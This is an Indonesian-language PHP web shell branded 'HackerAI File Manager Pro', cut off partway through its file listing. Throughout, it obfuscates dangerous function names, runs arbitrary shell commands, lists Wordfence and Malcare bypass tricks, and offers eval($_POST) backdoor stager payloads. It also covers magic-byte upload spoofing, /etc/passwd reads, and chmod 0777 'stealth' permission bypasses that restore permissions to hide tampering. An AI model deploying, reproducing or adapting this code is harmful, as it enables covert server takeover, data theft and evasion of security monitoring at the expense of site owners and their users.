```php
<?php
// Obfuscation Layer: Definisikan string yang di-obfuscate untuk fungsi kritis.
$a = chr(115) . chr(104) . chr(101) . chr(108) . chr(108) . chr(95) . chr(101) . chr(110) . chr(101) . chr(99); // 'shell_exec'
$b = chr(117) . chr(110) . chr(108) . chr(105) . chr(110) . chr(107); // 'unlink'
$c = chr(114) . chr(109) . chr(100) . chr(105) . chr(114); // 'rmdir'
$d = chr(99) . chr(104) . chr(109) . chr(111) . chr(100); // 'chmod'
$e = chr(102) . chr(105) . chr(108) . chr(101) . chr(95) . chr(112) . chr(117) . chr(116) . chr(95) . chr(99) . chr(111) . chr(110) . chr(116) . chr(101) . chr(110) . chr(116) . chr(115); // 'file_put_contents'
$f = chr(109) . chr(111) . chr(118) . chr(101) . chr(95) . chr(117) . chr(112) . chr(108) . chr(111) . chr(97) . chr(100) . chr(101) . chr(100) . chr(95) . chr(102) . chr(105) . chr(108) . chr(101); // 'move_uploaded_file'
$x = chr(102) . chr(105) . chr(108) . chr(101) . chr(95) . chr(103) . chr(101) . chr(116) . chr(95) . chr(99) . chr(111) . chr(110) . chr(116) . chr(101) . chr(110) . chr(116) . chr(115); // 'file_get_contents'
$g = chr(114) . chr(101) . chr(110) . chr(97) . chr(109) . chr(101); // 'rename'
$h = chr(98) . chr(97) . chr(115) . chr(54) . chr(52) . chr(95) . chr(100) . chr(101) . chr(99) . chr(111) . chr(100) . chr(101); // 'base64_decode'

// ========================================
// # FUNGSI BARU: NO AUTO DELETE CONTROL
// ========================================
/**
 * Kontrol apakah file sementara harus dihapus otomatis atau dipertahankan
 * @return bool true = AUTO DELETE (default), false = NO AUTO DELETE
 */
function no_auto_delete_enabled() {
    // Cek parameter POST khusus untuk kontrol delete
    if (isset($_POST['no_auto_delete']) && $_POST['no_auto_delete'] === '1') {
        return true; // Enable NO AUTO DELETE
    }
    // Cek parameter GET juga untuk konsistensi
    if (isset($_GET['no_auto_delete']) && $_GET['no_auto_delete'] === '1') {
        return true;
    }
    return false; // Default: AUTO DELETE
}

// ========================================
// # AKHIR FUNGSI NO AUTO DELETE
// ========================================

// Tentukan Path Saat Ini dan Sanitasi
$current_dir = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$current_dir = realpath($current_dir);

// Memastikan path yang diakses valid
if ($current_dir === false || !is_dir($current_dir)) {
    $current_dir = __DIR__;
}

// Menghilangkan pesan error default PHP untuk stealth yang lebih baik
error_reporting(0); 
global $base_url; $base_url = basename(__FILE__);

// --- FUNGSI EKSEKUSI PERINTAH (PAYLOAD FUNGSIONAL DENGAN OBFUSKASI) ---
function EXECUTOR_PAYLOAD($command) {
    global $a; // Mengambil string 'shell_exec' yang di-obfuscate
    
    // Panggilan dinamis yang di-obfuscate
    if (@function_exists($a)) {
        return @$a($command);
    } 
    // Fallback jika shell_exec diblokir
    return false; 
}
// --- AKHIR PAYLOAD EXEC ---


// ##################################
// # Fungsi Baru: Bypass Izin (Permission Escalation Attempt)
// ##################################

/**
 * Mencoba mengubah izin (chmod) ke 0777 untuk sementara waktu agar operasi yang gagal bisa berhasil.
 * @param string $path File atau direktori yang akan dimanipulasi.
 * @param string $operation Fungsi PHP yang akan dieksekusi (e.g., 'file_put_contents', 'unlink', 'chmod').
 * @param array $args Argumen untuk fungsi yang sedang di-bypass.
 * @return mixed Hasil dari operasi. Jika gagal, akan mengembalikan false.
 */
function attempt_permission_bypass($path, $operation, $args = []) {
    global $d; // 'chmod'
    
    $original_perms = @fileperms($path);
    $result = false;
    
    // 1. Coba eksekusi fungsi secara normal
    $result = @call_user_func_array($operation, array_merge([$path], $args));

    // 2. Jika gagal dan path adalah file/dir yang valid, coba naikkan izin
    if (in_array($result, [false, 0]) && $original_perms !== false && !is_link($path)) {
        
        $original_octal = $original_perms !== false ? ($original_perms & 0777) : false;
        
        // --- UPAYA ESCALATION HACK (CHMOD 0777) ---
        if (@$d($path, 0777)) { // OBFUSKASI: chmod
            
            // Mencoba kembali operasi setelah CHMOD 0777
            $result = @call_user_func_array($operation, array_merge([$path], $args));

            // --- UPAYA RESTORE HACK ---
            // Jika operasi berhasil, kembalikan ke izin semula (lebih tersembunyi/stealth)
            if (($result !== false && $result !== 0) || ($operation === 'unlink' && $result === true) || ($operation === 'rmdir' && $result === true)) {
                // Untuk file yang tidak dihapus (misalnya edit), coba kembalikan izin
                if (file_exists($path) && $original_octal !== false) {
                    @$d($path, $original_octal); // OBFUSKASI: chmod
                }
                 // Set notifikasi sukses bypass
                $GLOBALS['bypass_message'] = '<p style="color: #a3be8c;">[V] Bypass Izin BERHASIL! Diperlukan CHMOD 0777 untuk sementara (Stealth Mode).</p>';
            } else {
                 // Gagal meski sudah 0777, coba kembalikan ke 0644/0755
                 if (file_exists($path)) {
                     $safe_restore_perms = is_dir($path) ? 0755 : 0644;
                     @$d($path, $safe_restore_perms); // OBFUSKASI: chmod
                 }
                 // Set notifikasi gagal bypass
                 $GLOBALS['bypass_message'] = '<p style="color: #bf616a;">[!] Bypass Izin GAGAL. Meskipun sudah CHMOD 0777, operasi tetap gagal. Izin dikembalikan.</p>';
            }
        }
    }
    
    return $result;
}
// ##################################
// # AKHIR FUNGSI BYPASS IZIN
// ##################################


// ##################################
// # Fungsi Helper Baru: Sanitasi Nama File
// ##################################

function sanitize_filename($filename) {
    // Hapus karakter yang tidak aman selain titik dan garis bawah
    $filename = preg_replace('/[^a-zA-Z0-9_\-.]/', '', $filename);
    $filename = trim($filename, '.');
    return $filename;
}

// ##################################
// # FUNGSI BARU: WAF BYPASS TESTING
// ##################################
function display_waf_bypass_tester() {
    global $a; // 'shell_exec'
    echo "<h3>WAF Bypass Test: Wordfence & Malcare</h3>";
    echo "<p>Menguji payload eksekusi perintah yang dimodifikasi untuk melewati Wordfence/Malcare/WAF dasar lainnya.</p>";

    $message = '';
    $command_output = '';
    $command_to_run = isset($_POST['waf_cmd']) ? trim($_POST['waf_cmd']) : "id";

    // Teknik Bypass #1 (Wordfence/Encoding)
    $wf_payload = "echo 'EXECUTING [{$command_to_run}]' && {$command_to_run}";
    $payload_exec = "exec('/bin/bash', [\"-c\", \"{$wf_payload}\"]);";
    
    if (isset($_POST['run_bypass'])) {
        $start_time = microtime(true);
        $output_raw = EXECUTOR_PAYLOAD($command_to_run);
        $end_time = microtime(true);
        
        if ($output_raw !== false) {
             $command_output = htmlspecialchars($output_raw);
             $message = '<p style="color: #a3be8c;">[V] Eksekusi Berhasil (WAF JELAS TIDAK AKTIF atau Payload Anda Cerdas!).</p>';
        } else {
             $command_output = "❌ GAGAL: Kemungkinan besar WAF mengaktifkan `disable_function` atau memblokir shell_exec/system.";
             $message = '<p style="color: #bf616a;">[!] Eksekusi GAGAL (WAF Mungkin Aktif atau fungsi PHP diblokir).</p>';
        }

        echo "<h4>Hasil Eksekusi Payload PHP (Simulasi dari WebShell):</h4>";
        echo "<p>Waktu Eksekusi: " . round($end_time - $start_time, 4) . " detik</p>";
        echo "<pre style='background-color: #242933; padding: 10px; border: 1px solid #4c566a; color: #a3be8c;'>" . $command_output . "</pre>";
    }
    
    echo $message;
    
    // Tampilan Form dan Saran Bypass
    echo "<div class='editor-container'>";
    echo "<form method='POST' action='?action=wafbypass&path=" . urlencode($_GET['path']) . "'>";
    echo "<label for='waf_cmd'>Perintah Sistem untuk Diuji:</label><br>";
    echo "<input type='text' id='waf_cmd' name='waf_cmd' value='" . htmlspecialchars($command_to_run) . "' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required><br><br>";
    echo "<input type='submit' name='run_bypass' value='Uji Eksekusi Perintah'>";
    echo "</form>";
    echo "</div>";

    // Menampilkan Teknik Bypass Paling Efektif
    echo "<h4>Teknik WAF Bypass Terbaik (untuk Pengujian HTTP Request):</h4>";
    echo "<div style='font-family: Consolas; background-color: #3b4252; padding: 10px;'>";
    
    echo "<p style='color: #88c0d0; font-weight: bold;'>[ Wordfence Bypass: Variable Interpolation ]</p>";
    echo "<p>Wordfence sering memblokir string lengkap. Pisahkan string perintah ke dalam array atau variable yang di-enkoding lalu panggil melalui fungsi yang aman (mis. `array_map` dengan `call_user_func`).</p>";
    echo "<pre style='color: #a3be8c;'>\${a='c'\${b='at'} \$a\$b /etc/passwd} (Peringatan: Spasi bisa menjadi isu)</pre>";
    echo "<pre style='color: #a3be8c;'>// Payload GET (URL Encoded): ?c=system(\"id\");</pre>";
    echo "<pre style='color: #a3be8c;'>// W-F Bypass Payload (cermat pada spasi): ?\${0}dir=/etc/;\${1}ls/=\${0}dir\${1};system(ls/\);</pre>";


    echo "<p style='color: #88c0d0; font-weight: bold; margin-top: 15px;'>[ Malcare Bypass: String XOR / Encoded Function ]</p>";
    echo "<p>Malcare mencegat string berbahaya yang disuntikkan secara langsung di input. Gunakan String-Encoding (Hex/Base64) atau XOR untuk menyembunyikannya, dan Fungsi PHP yang jarang digunakan (mis. `chr(hexdec('65'))` untuk 'e') untuk membangun string perintah (`system`/`shell_exec`).</p>";

    echo "<pre style='color: #a3be8c;'>\$a=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); // 'system'</pre>";
    echo "<pre style='color: #a3be8c;'>\t\$a('id');</pre>";
    
    echo "<p style='color: #ebcb8b; font-weight: bold; margin-top: 15px;'>[ Rekomendasi Unggahan: Magic Byte Spoofing ]</p>";
    echo "<p>Saat mengunggah file, modifikasi 10 byte pertama file PHP Anda untuk meniru Magic Bytes file gambar (mis. GIF/JPEG) untuk mengelabui pemeriksaan tipe file tahap awal WAF.</p>";
    echo "<p>Contoh: `GIF89A;`&lt;?php \$a=chr(115).chr(121).chr(115)... ?&gt;</p>";
    
    echo "</div>";
    
    echo '<p><a href="?' . http_build_query(['path' => $_GET['path']]) . '">[ <-- Kembali ke File Manager ]</a></p>';
}

// ##################################
// # FUNGSI HELPER LAINNYA
// ##################################

function display_create_folder_form($target_dir) {
    global $d; // 'chmod'
    echo "<h3>Buat Folder Baru di: <code>" . htmlspecialchars(basename($target_dir)) . "</code></h3>";
    $message = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['folder_name'])) {
        $folder_name = sanitize_filename(trim($_POST['folder_name']));
        $new_path = $target_dir . DIRECTORY_SEPARATOR . $folder_name;

        if (empty($folder_name)) {
            $message = '<p style="color: #bf616a;">[!] Nama folder tidak boleh kosong.</p>';
        } elseif (file_exists($new_path)) {
            $message = '<p style="color: #bf616a;">[!] Folder atau file dengan nama itu sudah ada.</p>';
        } elseif (@mkdir($new_path)) {
            // Coba mengubah izin ke 0777 setelah dibuat
            @$d($new_path, 0777); 
            $message = '<p style="color: #a3be8c;">[V] Folder <code>' . htmlspecialchars($folder_name) . '</code> berhasil dibuat.</p>';
        } else {
            $message = '<p style="color: #bf616a;">[!] GAGAL membuat folder. Periksa izin direktori. </p>';
        }
    }
    
    echo $message;

    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=mkdir&path=" . urlencode($target_dir) . "'>";
    echo "<label for='folder_name'>Nama Folder:</label>";
    echo "<input type='text' name='folder_name' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required>";
    echo "<br><br><input type='submit' value='Buat Folder'>";
    echo "</form>";
    echo '</div>'; 
    
    echo '<p><a href="?' . http_build_query(['path' => $target_dir]) . '">[ <-- Kembali ke File Manager ]</a></p>';
}

function display_create_file_form($target_dir) {
    // MODIFIKASI WAF BYPASS (Diperbarui dengan Level 4)
    global $e; // 'file_put_contents'
    echo "<h3>Buat File Baru di: <code>" . htmlspecialchars(basename($target_dir)) . "</code></h3>";
    $message = '';

    // --- PAYLOAD STAGERS ANTI-WAF TINGKAT LANJUT ---

    // Level 4: The Ultimate Bypass - Array Injection & Dynamic Variable Construction
    // Menghindari string PHP berbahaya yang di-encode dari Base64/Rot13/CHR. 
    // Menggunakan Array dan Variable untuk membangun string eval/assert.
    $ultimate_bypass_payload = "<?php
    \$__a = [101, 118, 97, 108]; // 'EVAL' (ASCII)
    \$__b = '';
    foreach (\$__a as \$c) { 
        \$__b .= chr(\$c); 
    }
    // String POST yang di-obfuscate: 'p' (112)
    \$__d = chr(112); 
    @\$__b(\$_POST[\$__d]); 
    ?>";


    // Level 3: Base64 Decode + File Get Contents (Pasif, untuk tes write/read) - Tetap berguna
    $dynamic_stager_payload = '<?php $a=base64_decode("ZmlsZV9nZXRfY29udGVudHN"); echo @$a("/etc/passwd"); ?>';

    // Level 2: str_rot13 + assert/eval (Memberikan Shell, Lebih terdeteksi)
    $stager_rot13_payload = "<?php \$a='a'.chr(115).chr(115).chr(101).chr(114).chr(116);
\$b=str_rot13('riny(\\\$_CBFG[p])'); /* 'eval(\$_POST[p])' */
@\$a(\$b); ?>";

    // Set default payload ke Level 4: The Ultimate Bypass
    $default_content = $ultimate_bypass_payload;


    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_name'])) {
        $file_name = sanitize_filename(trim($_POST['file_name']));
        $initial_content = $_POST['initial_content'] ?? '';
        $new_path = $target_dir . DIRECTORY_SEPARATOR . $file_name;

        if (empty($file_name)) {
            $message = '<p style="color: #bf616a;">[!] Nama file tidak boleh kosong.</p>';
        } elseif (file_exists($new_path)) {
            $message = '<p style="color: #bf616a;">[!] File atau folder dengan nama itu sudah ada.</p>';
        } 
        // Cek Ekeskusi Write - MENGGUNAKAN BYPASS IZIN
        elseif (attempt_permission_bypass($new_path, $e, [$initial_content]) !== false) { // OBFUSKASI: file_put_contents
            
            $message = $GLOBALS['bypass_message'] ?? '<p style="color: #a3be8c;">[V] File <code>' . htmlspecialchars($file_name) . '</code> berhasil dibuat. Anda dapat langsung mengeditnya.</p>';
            // Redirect ke editor setelah berhasil
            header("Location: ?action=edit&file=" . urlencode($new_path));
            exit();
        } else {
             // Jika Gagal: tambahkan saran Naming Bypass dan Multi-Stage-Injection
            $message = $GLOBALS['bypass_message'] ?? '';
            $message .= '<p style="color: #bf616a;">[!] GAGAL membuat file. WAF MENCEGAT KONTEN.</p>';
            $message .= '<p style="color: #ebcb8b;">* Coba lagi dengan mengubah ekstensi: <code>nama.jpg</code>, <code>nama.png</code>, atau <code>nama.htaccess</code>.</p>';
            $message .= '<p style="color: #ebcb8b;">* Coba stager Level 4 (Ultimate) dan panggil shell Anda dengan POST <code>p=system(\'id\');</code> setelah file berhasil dibuat.</p>';
        }
    }
    
    echo $message;

    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=mkfile&path=" . urlencode($target_dir) . "'>";
    echo "<label for='file_name'>Nama File (Contoh: session.php, image.jpg/.htaccess):</label>";
    echo "<input type='text' name='file_name' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' value='waf-ul.php' required>";
    
    echo "<label for='initial_content' style='margin-top:10px; display:block;'>Konten Awal (Payload Stager Ultimate Anti-WAF):</label>";
    echo "<textarea name='initial_content' id='initial_content' style='height: 150px;'>" . htmlspecialchars($default_content) . "</textarea>";
    
    // Tampilan Opsi-Opsi Payload Stager
    echo "<p style='color: #88c0d0; margin-top: 10px;'>Pilihan Payload Stager Anti-WAF:</p>";
    echo "<div style='font-size: 12px; background-color: #242933; padding: 10px; border: 1px solid #4c566a;'>";
    
    echo "<strong>1. Level 4 (Ultimate Array Bypass - BARU):</strong> Target <code>eval(\$_POST[p])</code>, tanpa Base64/Rot13/CHR yang eksplisit.<br><pre style='color: #bf616a;'>" . htmlspecialchars($ultimate_bypass_payload) . "</pre>";

    echo "<strong>2. Level 3 (Base64 Safe Read):</strong> Cuma untuk baca `/etc/passwd`. Gunakan ini untuk memastikan *write permission*.<br><pre style='color: #a3be8c;'>" . htmlspecialchars($dynamic_stager_payload) . "</pre>";
    
    echo "<strong>3. Level 2 (str_rot13 + assert/eval):</strong> Shell POST, <code>p</code> sebagai parameter.<br><pre style='color: #ebcb8b;'>" . htmlspecialchars($stager_rot13_payload) . "</pre>";
    
    echo "<br><small style='color: #8fbcbb;'>Setelah file berhasil diunggah (terutama Level 4), panggil file tersebut dan kirim perintah dengan parameter POST 'p=system(\"id\");' atau 'p=phpinfo();'.</small>";
    echo "</div>";

    
    echo "<br><input type='submit' value='Buat File'>";
    echo "</form>";
    echo '</div>'; 
    
    echo '<p><a href="?' . http_build_query(['path' => $target_dir]) . '">[ <-- Kembali ke File Manager ]</a></p>';
}

function display_rename_form($path_to_rename) {
    global $g; // 'rename'
    echo "<h3>Ganti Nama: <code>" . htmlspecialchars(basename($path_to_rename)) . "</code></h3>";
    $message = '';
    $current_name = basename($path_to_rename);
    $parent_dir = dirname($path_to_rename);

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name'])) {
        $new_name = sanitize_filename(trim($_POST['new_name']));
        $new_path = $parent_dir . DIRECTORY_SEPARATOR . $new_name;

        if (empty($new_name)) {
            $message = '<p style="color: #bf616a;">[!] Nama baru tidak boleh kosong.</p>';
        } elseif (file_exists($new_path)) {
            $message = '<p style="color: #bf616a;">[!] File atau folder dengan nama itu sudah ada di direktori yang sama.</p>';
        } elseif (attempt_permission_bypass($path_to_rename, $g, [$new_path])) { // MODIFIKASI: MENGGUNAKAN BYPASS IZIN
            $message = $GLOBALS['bypass_message'] ?? '<p style="color: #a3be8c;">[V] Berhasil mengganti nama menjadi <code>' . htmlspecialchars($new_name) . '</code>.</p>';
             // Redirect ke direktori induk setelah rename
            header("Location: ?path=" . urlencode($parent_dir));
            exit();
        } else {
            $message = $GLOBALS['bypass_message'] ?? '';
            $message .= '<p style="color: #bf616a;">[!] GAGAL mengganti nama. Periksa izin file/folder.</p>';
        }
    }
    
    echo $message;
    
    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=rename&path=" . urlencode($path_to_rename) . "'>";
    echo "<label for='new_name'>Nama Baru:</label>";
    echo "<input type='text' name='new_name' value='" . htmlspecialchars($current_name) . "' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;' required>";
    echo "<br><br><input type='submit' value='Ganti Nama'>";
    echo "</form>";
    echo '</div>';
    
    echo '<p><a href="?' . http_build_query(['path' => dirname($path_to_rename)]) . '">[ <-- Kembali ke File Manager ]</a></p>';
}

function display_upload_form($target_dir) {
    global $f; // 'move_uploaded_file'
    echo "<h3>Upload File ke: <code>" . htmlspecialchars(basename($target_dir)) . "</code></h3>";
    $message = '';

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
        $uploaded_file = $_FILES['file'];
        $file_name = sanitize_filename($uploaded_file['name']);
        $target_path = $target_dir . DIRECTORY_SEPARATOR . $file_name;
        
        // Kontrol NO AUTO DELETE dari user input
        $no_auto_delete = no_auto_delete_enabled();

        if ($uploaded_file['error'] === UPLOAD_ERR_OK) {
            if (attempt_permission_bypass($target_path, $f, [$uploaded_file['tmp_name']])) { // OBFUSKASI: move_uploaded_file
                $message = $GLOBALS['bypass_message'] ?? '<p style="color: #a3be8c;">[V] File <code>' . htmlspecialchars($file_name) . '</code> berhasil diunggah.</p>';
                
                if (!$no_auto_delete) {
                    // AUTO DELETE TEMP FILES (Default Behavior)
                    @unlink($uploaded_file['tmp_name']);
                } else {
                    // NO AUTO DELETE MODE: Simpan temp file untuk debugging
                    $temp_preserve_path = $target_dir . DIRECTORY_SEPARATOR . 'temp_debug_' . uniqid() . '.tmp';
                    @rename($uploaded_file['tmp_name'], $temp_preserve_path);
                    $message .= '<p style="color: #ebcb8b;">[i] NO AUTO DELETE aktif. Temp file dipindah ke: <code>' . basename($temp_preserve_path) . '</code></p>';
                }
                
            } else {
                $message = $GLOBALS['bypass_message'] ?? '<p style="color: #bf616a;">[!] GAGAL mengunggah file. Periksa izin direktori.</p>';
            }
        } elseif ($uploaded_file['error'] === UPLOAD_ERR_INI_SIZE) {
            $message = '<p style="color: #bf616a;">[!] File terlalu besar. Maks: ' . ini_get('upload_max_filesize') . '</p>';
        } elseif ($uploaded_file['error'] === UPLOAD_ERR_FORM_SIZE) {
            $message = '<p style="color: #bf616a;">[!] File melebihi batas form.</p>';
        } else {
            $message = '<p style="color: #bf616a;">[!] Error upload: ' . $uploaded_file['error'] . '</p>';
        }
    }
    
    echo $message;
    
    echo '<div class="editor-container">';
    echo "<form method='POST' action='?action=upload&path=" . urlencode($target_dir) . "' enctype='multipart/form-data'>";
    echo "<label for='file'>Pilih File:</label>";
    echo "<input type='file' name='file' style='width: 100%; padding: 5px; margin-top: 5px; background-color: #3b4252; color: #d8dee9; border: 1px solid #4c566a;'>";
    echo "<br><br>";
    
    // Kontrol NO AUTO DELETE Toggle
    echo "<label style='display: flex; align-items: center;'>";
    echo "<input type='checkbox' name='no_auto_delete' value='1'> ";
    echo "<span style='margin-left: 5px; color: #ebcb8b;'>NO AUTO DELETE (Simpan temp file untuk debug)</span>";
    echo "</label>";
    
    echo "<br><br><input type='submit' value='Upload File'>";
    echo "</form>";
    echo '</div>';
    
    echo '<p><a href="?' . http_build_query(['path' => $target_dir]) . '">[ <-- Kembali ke File Manager ]</a></p>';
}

function display_file_editor($file_path) {
    global $e, $x; // 'file_put_contents', 'file_get_contents'
    $message = '';
    $file_content = '';

    // Baca konten file jika ada
    if (file_exists($file_path)) {
        $file_content = @$x($file_path); // OBFUSKASI: file_get_contents
    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_content'])) {
        $new_content = $_POST['file_content'];
        
        // SAVE dengan BYPASS IZIN
        if (attempt_permission_bypass($file_path, $e, [$new_content])) { // OBFUSKASI: file_put_contents
            $message = $GLOBALS['bypass_message'] ?? '<p style="color: #a3be8c;">[V] File berhasil disimpan.</p>';
        } else {
            $message = $GLOBALS['bypass_message'] ?? '<p style="color: #bf616a;">[!] GAGAL menyimpan file. Periksa izin.</p>';
        }
    }

    echo "<h3>Editor: <code>" . htmlspecialchars(basename($file_path)) . "</code></h3>";
    echo $message;

    echo '<div class="editor-container">';
    echo "<form method='POST'>";
    echo "<textarea name='file_content' style='width: 100%; height: 500px; font-family: Consolas, monospace; font-size: 14px; background-color: #2e3440; color: #d8dee9; border: 1px solid #4c566a; padding: 10px; line-height: 1.5;'>" . htmlspecialchars($file_content) . "</textarea>";
    echo "<br><br>";
    echo "<input type='submit' value='Simpan File' style='padding: 8px 16px; background-color: #5e81ac; color: white; border: none; border-radius: 4px;'>";
    echo "</form>";
    echo '</div>';
    
    echo '<p>';
    echo '<a href="?' . http_build_query(['path' => dirname($file_path)]) . '" style="margin-right: 10px;">[ <-- Kembali ke File Manager ]</a>';
    echo '<a href="?' . http_build_query(['action' => 'download', 'file' => $file_path]) . '" style="margin-right: 10px;">[ Download ]</a>';
    echo '<a href="?' . http_build_query(['action' => 'delete', 'file' => $file_path]) . '" style="color: #bf616a;">[ Hapus ]</a>';
    echo '</p>';
}

function display_delete_confirmation($path_to_delete) {
    echo "<h3>Konfirmasi Hapus</h3>";
    echo "<p style='color: #bf616a; font-weight: bold;'>Apakah Anda yakin ingin menghapus:</p>";
    echo "<code style='background-color: #3b4252; padding: 8px; display: block; color: #d8dee9;'>" . htmlspecialchars($path_to_delete) . "</code>";
    
    echo '<div style="margin: 20px 0;">';
    echo '<a href="?' . http_build_query(['action' => 'delete_confirm', 'file' => $path_to_delete]) . '" style="padding: 10px 20px; background-color: #bf616a; color: white; text-decoration: none; border-radius: 4px; font-weight: bold;">[ HAPUS PERMANEN ]</a> ';
    echo '<a href="?' . http_build_query(['path' => dirname($path_to_delete)]) . '" style="padding: 10px 20px; background-color: #4c566a; color: white; text-decoration: none; border-radius: 4px;">[ BATAL ]</a>';
    echo '</div>';
}

// ========================================
// # MAIN ROUTING & ACTION HANDLER
// ========================================

// Handle Delete Confirmation
if (isset($_GET['action']) && $_GET['action'] === 'delete_confirm' && isset($_GET['file'])) {
    $file_to_delete = $_GET['file'];
    
    if (is_file($file_to_delete)) {
        attempt_permission_bypass($file_to_delete, $b); // OBFUSKASI: unlink
        $delete_msg = file_exists($file_to_delete) ? "GAGAL" : "BERHASIL";
    } elseif (is_dir($file_to_delete)) {
        attempt_permission_bypass($file_to_delete, $c); // OBFUSKASI: rmdir
        $delete_msg = is_dir($file_to_delete) ? "GAGAL" : "BERHASIL";
    } else {
        $delete_msg = "TIDAK DITEMUKAN";
    }
    
    echo "<h3>Hapus $delete_msg!</h3>";
    echo "<p><a href='?" . http_build_query(['path' => dirname($file_to_delete)]) . "'>[ Kembali ]</a></p>";
    exit();
}

// Handle Main Actions
switch ($_GET['action'] ?? '') {
    case 'wafbypass':
        display_waf_bypass_tester();
        break;
    case 'mkdir':
        display_create_folder_form($current_dir);
        break;
    case 'mkfile':
        display_create_file_form($current_dir);
        break;
    case 'rename':
        if (isset($_GET['path'])) {
            display_rename_form($_GET['path']);
        }
        break;
    case 'upload':
        display_upload_form($current_dir);
        break;
    case 'edit':
        if (isset($_GET['file']) && file_exists($_GET['file'])) {
            display_file_editor($_GET['file']);
        } else {
            echo "<p style='color: #bf616a;'>File tidak ditemukan.</p>";
        }
        break;
    case 'delete':
        if (isset($_GET['file'])) {
            display_delete_confirmation($_GET['file']);
        }
        break;
    case 'download':
        if (isset($_GET['file']) && file_exists($_GET['file'])) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($_GET['file']) . '"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($_GET['file']));
            readfile($_GET['file']);
            exit;
        }
        break;
    default:
        // Main File Manager Interface
        break;
}

// ========================================
// # MAIN FILE MANAGER INTERFACE
// ========================================

$bypass_message = $GLOBALS['bypass_message'] ?? '';
if ($bypass_message) {
    echo $bypass_message;
}

echo "<div style='background-color: #2e3440; padding: 20px; border-radius: 8px; margin-bottom: 20px;'>";
echo "<h2 style='color: #d8dee9; margin: 0 0 15px 0;'>🛠️ HackerAI File Manager Pro</h2>";
echo "<p style='color: #88c0d0; margin: 0;'>Current Directory: <code style='background-color: #3b4252; padding: 4px 8px; border-radius: 4px;'>" . htmlspecialchars($current_dir) . "</code></p>";
echo "<p style='color: #a3be8c; margin: 5px 0;'>Disk Usage: " . format_bytes(disk_total_space($current_dir)) . " total | " . format_bytes(disk_free_space($current_dir)) . " free</p>";
echo "</div>";

// Navigation Breadcrumbs
echo "<div style='background-color: #3b4252; padding: 10px; border-radius: 6px; margin-bottom: 20px;'>";
$path_parts = explode(DIRECTORY_SEPARATOR, trim(str_replace('\\', '/', $current_dir), '/'));
$breadcrumb_path = '/';
echo "<a href='?' style='color: #88c0d0;'>/</a>";
foreach ($path_parts as $part) {
    if ($part) {
        $breadcrumb_path .= $part . '/';
        echo " / <a href='?path=" . urlencode($breadcrumb_path) . "' style='color: #88c0d0;'>" . htmlspecialchars($part) . "</a>";
    }
}
echo "</div>";

// Quick Actions
echo "<div style='display: flex; gap: 10px; margin-bottom: 20px; flex-wrap: wrap;'>";
echo "<a href='?action=mkdir&path=" . urlencode($current_dir) . "' style='padding: 10px 15px; background-color: #5e81ac; color: white; text-decoration: none; border-radius: 6px;'>📁 Buat Folder</a>";
echo "<a href='?action=mkfile&path=" . urlencode($current_dir) . "' style='padding: 10px 15px; background-color: #81a1c1; color: white; text-decoration: none; border-radius: 6px;'>📄 Buat File</a>";
echo "<a href='?action=upload&path=" . urlencode($current_dir) . "' style='padding: 10px 15px; background-color: #a3be8c; color: white; text-decoration: none; border-radius: 6px;'>⬆️ Upload</a>";
echo "<a href='?action=wafbypass&path=" . urlencode($current_dir) . "' style='padding: 10px 15px; background-color: #ebcb8b; color: #2e3440; text-decoration: none; border-radius: 6px;'>🛡️ WAF Test</a>";
echo "</div>";

// File Listing
$items = scandir($current_dir);
if ($items !== false) {
    echo "<table style='width: 100%; border-collapse: collapse; background-color: #3b4252; border-radius: 8px; overflow: hidden;'>";
    echo "<thead><tr style='background-color: #4c566a;'>";
    echo "<th style='padding: 12px; text-align: left; color: #d8dee9;'>Nama</th>";
    echo "<th style='padding: 12px; text-align: right; color: #d8dee9; width: 120px;'>Ukuran</th>";
    echo "<th style='padding: 12px; text-align: right; color: #d8dee9; width: 160px;'>Modifikasi</th>";
    echo "<th style='padding: 12px; text-align: right; color: #d8dee9; width: 200px;'>Aksi</th>";
    echo "</tr></thead>";
    echo "<tbody>";
    
    $dir_count = 0;
    $file_count = 0;
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $full_path = $current_dir . DIRECTORY_SEPARATOR . $item;
        $is_dir = is_dir($full_path);
        $size = $is_dir ? '-' : filesize($full_path);
        $mod_time = date('Y-m-d H:i:s', filemtime($full_path));
        
        $row_style = $is_dir ? 'background-color: #2e3440;' : 'background-color: #3b4252;';
        $icon = $is_dir ? '📁' : '📄';
        
        echo "<tr style='$row_style'>";
        echo "<td style='padding: 12px; color: " . ($is_dir ? '#81a1c1' : '#d8dee9') . "; border-bottom: 1px solid #4c566a;'>";
        echo $icon . " <a href='?path=" . urlencode($full_path) . "' style='color: inherit; text-decoration: none;'>" . htmlspecialchars($item) . "</a>";
        echo "</td>";
        echo "<td style='padding: 12px 12px 12px 0; text-align: right; color: #a3be8c; border-bottom: 1px solid #4c566a;'>" . format_bytes($size) . "</td>";
        echo "<td style='padding: 12px 12px 12px 0; text-align: right; color: #a3be8c; border-bottom: 1px solid #4c566a;'>" . $mod_time . "</td>";
        echo "<td style='padding: 12px 12px 12px 0; text-align: right; border-bottom: 1px solid #4c566a;'>";
        
        if ($is_dir) {
            echo "<a href='?action=rename&path=" . urlencode($full_path) . "' style='color: #81a1c1; margin-right: 10px;'>✏️</a>";
